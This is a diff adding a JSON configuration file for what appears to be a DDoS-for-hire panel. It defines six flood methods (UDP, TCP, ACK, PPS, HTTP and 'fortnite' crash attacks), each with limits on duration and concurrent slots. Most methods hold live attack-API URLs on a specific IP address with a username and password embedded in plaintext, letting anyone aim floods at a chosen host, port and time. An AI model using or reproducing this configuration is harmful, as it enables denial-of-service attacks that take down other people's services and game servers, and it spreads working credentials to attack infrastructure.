@@ -1,0 +1,145 @@
+{
+    "attacks": [
+        {
+            "method_name": "!pps",
+            "links": ["http://176.100.36.150:5050/api/attack?username=lonapi&password=1122&target=<host>&port=<port>&time=<time>&method=raw-pps"],
+            "configuration": {
+                "method_slots": {"max": 3, "enabled": true},
+                "method_min_time": {"time": 1, "enabled": true},
+                "method_max_time": {
+                    "hard": {"time": 60, "enabled": true},
+                    "soft": {"time": 60, "enabled": false}
+                }
+            },
+            "method_status": {
+                "method_is_enabled": true,
+                "settings": {"cnc_access_only": false, "api_access_only": false},
+                "restrictions": {
+                    "what_targets_to_allow": {"ip_address": true, "url": true, "domain": true, "subnet": false},
+                    "method_group": {"method_group_name": "Main Network", "require_method_group_role": false},
+                    "as_number_whitelist": {"enabled": false, "as_number": []},
+                    "vip": true,
+                    "private": {"enabled": false, "users": []}
+                }
+            }
+        },
+        {
+            "method_name": "!udp",
+            "links": ["http://176.100.36.150:5050/api/attack?username=lonapi&password=1122&target=<host>&port=<port>&time=<time>&method=raw-udp"],
+            "configuration": {
+                "method_slots": {"max": 3, "enabled": true},
+                "method_min_time": {"time": 1, "enabled": true},
+                "method_max_time": {
+                    "hard": {"time": 60, "enabled": true},
+                    "soft": {"time": 60, "enabled": false}
+                }
+            },
+            "method_status": {
+                "method_is_enabled": true,
+                "settings": {"cnc_access_only": false, "api_access_only": false},
+                "restrictions": {
+                    "what_targets_to_allow": {"ip_address": true, "url": true, "domain": true, "subnet": false},
+                    "method_group": {"method_group_name": "Main Network", "require_method_group_role": false},
+                    "as_number_whitelist": {"enabled": false, "as_number": []},
+                    "vip": true,
+                    "private": {"enabled": false, "users": []}
+                }
+            }
+        },
+        {
+            "method_name": "!http",
+            "links": ["!http"],
+            "configuration": {
+                "method_slots": {"max": 3, "enabled": true},
+                "method_min_time": {"time": 1, "enabled": true},
+                "method_max_time": {
+                    "hard": {"time": 60, "enabled": true},
+                    "soft": {"time": 60, "enabled": false}
+                }
+            },
+            "method_status": {
+                "method_is_enabled": true,
+                "settings": {"cnc_access_only": false, "api_access_only": false},
+                "restrictions": {
+                    "what_targets_to_allow": {"ip_address": true, "url": true, "domain": true, "subnet": false},
+                    "method_group": {"method_group_name": "Main Network", "require_method_group_role": false},
+                    "as_number_whitelist": {"enabled": false, "as_number": []},
+                    "vip": true,
+                    "private": {"enabled": false, "users": []}
+                }
+            }
+        },
+        {
+            "method_name": "!tcp",
+            "links": ["http://176.100.36.150:5050/api/attack?username=lonapi&password=1122&target=<host>&port=<port>&time=<time>&method=raw-tcp"],
+            "configuration": {
+                "method_slots": {"max": 3, "enabled": true},
+                "method_min_time": {"time": 1, "enabled": true},
+                "method_max_time": {
+                    "hard": {"time": 60, "enabled": true},
+                    "soft": {"time": 60, "enabled": false}
+                }
+            },
+            "method_status": {
+                "method_is_enabled": true,
+                "settings": {"cnc_access_only": false, "api_access_only": false},
+                "restrictions": {
+                    "what_targets_to_allow": {"ip_address": true, "url": true, "domain": true, "subnet": false},
+                    "method_group": {"method_group_name": "Main Network", "require_method_group_role": false},
+                    "as_number_whitelist": {"enabled": false, "as_number": []},
+                    "vip": true,
+                    "private": {"enabled": false, "users": []}
+                }
+            }
+        },
+        {
+            "method_name": "!tab",
+            "links": [
+                "http://176.100.36.150:5050/api/attack?username=lonapi&password=1122&target=<host>&port=<port>&time=<time>&method=fortnite",
+                "http://176.100.36.150:5050/api/attack?username=lonapi&password=1122&target=<host>&port=<port>&time=<time>&method=crash-fortnite"
+            ],
+            "configuration": {
+                "method_slots": {"max": 3, "enabled": true},
+                "method_min_time": {"time": 1, "enabled": true},
+                "method_max_time": {
+                    "hard": {"time": 60, "enabled": true},
+                    "soft": {"time": 60, "enabled": false}
+                }
+            },
+            "method_status": {
+                "method_is_enabled": true,
+                "settings": {"cnc_access_only": false, "api_access_only": false},
+                "restrictions": {
+                    "what_targets_to_allow": {"ip_address": true, "url": true, "domain": true, "subnet": false},
+                    "method_group": {"method_group_name": "Main Network", "require_method_group_role": false},
+                    "as_number_whitelist": {"enabled": false, "as_number": []},
+                    "vip": true,
+                    "private": {"enabled": false, "users": []}
+                }
+            }
+        },
+        {
+            "method_name": "!ack",
+            "links": ["http://176.100.36.150:5050/api/attack?username=lonapi&password=1122&target=<host>&port=<port>&time=<time>&method=raw-ack"],
+            "configuration": {
+                "method_slots": {"max": 3, "enabled": true},
+                "method_min_time": {"time": 1, "enabled": true},
+                "method_max_time": {
+                    "hard": {"time": 60, "enabled": true},
+                    "soft": {"time": 60, "enabled": false}
+                }
+            },
+            "method_status": {
+                "method_is_enabled": true,
+                "settings": {"cnc_access_only": false, "api_access_only": false},
+                "restrictions": {
+                    "what_targets_to_allow": {"ip_address": true, "url": true, "domain": true, "subnet": false},
+                    "method_group": {"method_group_name": "Main Network", "require_method_group_role": false},
+                    "as_number_whitelist": {"enabled": false, "as_number": []},
+                    "vip": true,
+                    "private": {"enabled": false, "users": []}
+                }
+            }
+        }
+    ]
+}
